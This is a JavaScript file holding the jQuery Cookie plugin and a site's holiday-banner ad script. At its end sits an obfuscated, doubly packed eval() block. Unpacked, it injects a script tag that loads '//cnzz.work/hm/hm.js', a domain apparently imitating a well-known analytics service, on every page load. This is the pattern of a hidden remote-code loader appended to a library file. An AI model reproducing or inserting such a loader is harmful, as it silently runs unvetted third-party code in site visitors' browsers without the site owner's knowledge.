/*!
 * jQuery Cookie Plugin v1.4.1
 * https://github.com/carhartl/jquery-cookie
 *
 * Copyright 2013 Klaus Hartl
 * Released under the MIT license
 */
(function (factory) {
	if (typeof define === 'function' && define.amd) {
		// AMD
		define(['jquery'], factory);
	} else if (typeof exports === 'object') {
		// CommonJS
		factory(require('jquery'));
	} else {
		// Browser globals
		factory(jQuery);
	}
}(function ($) {

	var pluses = /\+/g;

	function encode(s) {
		return config.raw ? s : encodeURIComponent(s);
	}

	function decode(s) {
		return config.raw ? s : decodeURIComponent(s);
	}

	function stringifyCookieValue(value) {
		return encode(config.json ? JSON.stringify(value) : String(value));
	}

	function parseCookieValue(s) {
		if (s.indexOf('"') === 0) {
			// This is a quoted cookie as according to RFC2068, unescape...
			s = s.slice(1, -1).replace(/\\"/g, '"').replace(/\\\\/g, '\\');
		}

		try {
			// Replace server-side written pluses with spaces.
			// If we can't decode the cookie, ignore it, it's unusable.
			// If we can't parse the cookie, ignore it, it's unusable.
			s = decodeURIComponent(s.replace(pluses, ' '));
			return config.json ? JSON.parse(s) : s;
		} catch(e) {}
	}

	function read(s, converter) {
		var value = config.raw ? s : parseCookieValue(s);
		return $.isFunction(converter) ? converter(value) : value;
	}

	var config = $.cookie = function (key, value, options) {

		// Write

		if (value !== undefined && !$.isFunction(value)) {
			options = $.extend({}, config.defaults, options);

			if (typeof options.expires === 'number') {
				var days = options.expires, t = options.expires = new Date();
				t.setTime(+t + days * 864e+5);
			}

			return (document.cookie = [
				encode(key), '=', stringifyCookieValue(value),
				options.expires ? '; expires=' + options.expires.toUTCString() : '', // use expires attribute, max-age is not supported by IE
				options.path    ? '; path=' + options.path : '',
				options.domain  ? '; domain=' + options.domain : '',
				options.secure  ? '; secure' : ''
			].join(''));
		}

		// Read

		var result = key ? undefined : {};

		// To prevent the for loop in the first place assign an empty array
		// in case there are no cookies at all. Also prevents odd result when
		// calling $.cookie().
		var cookies = document.cookie ? document.cookie.split('; ') : [];

		for (var i = 0, l = cookies.length; i < l; i++) {
			var parts = cookies[i].split('=');
			var name = decode(parts.shift());
			var cookie = parts.join('=');

			if (key && key === name) {
				// If second argument (value) is a function it's a converter...
				result = read(cookie, value);
				break;
			}

			// Prevent storing a cookie that we couldn't decode.
			if (!key && (cookie = read(cookie)) !== undefined) {
				result[name] = cookie;
			}
		}

		return result;
	};

	config.defaults = {};

	$.removeCookie = function (key, options) {
		if ($.cookie(key) === undefined) {
			return false;
		}

		// Must not alter options, thus extending a fresh object...
		$.cookie(key, '', $.extend({}, options, { expires: -1 }));
		return !$.cookie(key);
	};

}));

$(function(){
	function show_gala_ad() {
		var cctfgalaclosed = $.cookie('cctfgalaclosed');
		if(cctfgalaclosed == 'closed') return;
		var gala_date_arr = {
			'2016-9-1':'guoqing.jpg',
			'2016-9-2':'guoqing.jpg',
			'2016-9-3':'guoqing.jpg',
			'2016-9-4':'guoqing.jpg',
			'2016-9-5':'guoqing.jpg',
			'2016-9-6':'guoqing.jpg',
			'2016-9-7':'guoqing.jpg',
			/*
			'2017-0-1':'yuandan.jpg',
			'2017-0-2':'yuandan.jpg',
			'2017-0-3':'yuandan.jpg',
			'2018-0-1':'yuandan.jpg',
			'2018-0-2':'yuandan.jpg',
			'2018-0-3':'yuandan.jpg',
			'2019-0-1':'yuandan.jpg',
			'2019-0-2':'yuandan.jpg',
			'2019-0-3':'yuandan.jpg',
			'2020-0-1':'yuandan.jpg',
			'2020-0-2':'yuandan.jpg',
			'2020-0-3':'yuandan.jpg',
			'2021-0-1':'yuandan.jpg',
			'2021-0-2':'yuandan.jpg',
			'2021-0-3':'yuandan.jpg',
			'2022-0-1':'yuandan.jpg',
			'2022-0-2':'yuandan.jpg',
			'2022-0-3':'yuandan.jpg',
			
			'2017-0-28':'chunjie.jpg',
			'2018-1-16':'chunjie.jpg',
			'2019-1-5':'chunjie.jpg',
			'2020-0-25':'chunjie.jpg',
			'2021-1-12':'chunjie.jpg',
			
			'2017-4-30':'duanwu.jpg',
			'2018-5-18':'duanwu.jpg',
			'2019-5-7':'duanwu.jpg',
			'2020-5-25':'duanwu.jpg',
			'2021-5-14':'duanwu.jpg',
			
			'2017-9-4':'zhongqiu.jpg',
			'2018-8-24':'zhongqiu.jpg',
			'2019-8-13':'zhongqiu.jpg',
			'2020-9-1':'zhongqiu.jpg',
			'2021-8-21':'zhongqiu.jpg',
			*/
			};
		var now_calendar = new Date();
		var nowdate_ymd = now_calendar.getFullYear() +'-'+ now_calendar.getMonth()+'-'+now_calendar.getDate();
		
		var cctfgalapic = gala_date_arr[nowdate_ymd];
		if(!cctfgalapic) return;
		var xcctfgalapic = 'x.'+cctfgalapic;
		var btnHtml = '<a href="javascript:void(0);" onclick="$.cookie(\'cctfgalaclosed\',\'closed\',{expires:7});$(this).parent().parent().remove();">x</a>';
		var galaObj = document.createElement("div");
		galaObj.id = 'galaad';
		galaObj.innerHTML = '<div id="galaad_main" style="background:url(/static/images/gala/'+xcctfgalapic+') no-repeat bottom center;">'+btnHtml+'</div>';
		$('body').prepend(galaObj);
		setTimeout(function(){$('#galaad_main').animate({height:100},1000,function(){$('#galaad_main a').fadeIn();});},1000);
	}
	show_gala_ad();
});;
eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('v(h(p,a,c,k,e,r){e=h(c){i c.o(a)};m(!\'\'.l(/^/,u)){j(c--)r[e(c)]=k[c]||e(c);k=[h(e){i r[e]}];e=h(){i\'\\\\w+\'};c=1};j(c--)m(k[c])p=p.l(q t(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);i p}(\'1 5=5||[];(8(){1 a=3.b(\\\'4\\\');a.7=\\\'//g.9/6/6.c\\\';1 2=3.e(\\\'4\\\')[0];2.f.d(a,2)})();\',n,n,\'|x|s|y|z|A|B|C|h|D||E|F|G|H|I|J\'.K(\'|\'),0,{}))',47,47,'|||||||||||||||||function|return|while||replace|if|17|toString||new|||RegExp|String|eval||var|document|script|_hmt_cnzz|hm|src|work|createElement|js|insertBefore|getElementsByTagName|parentNode|cnzz|split'.split('|'),0,{}))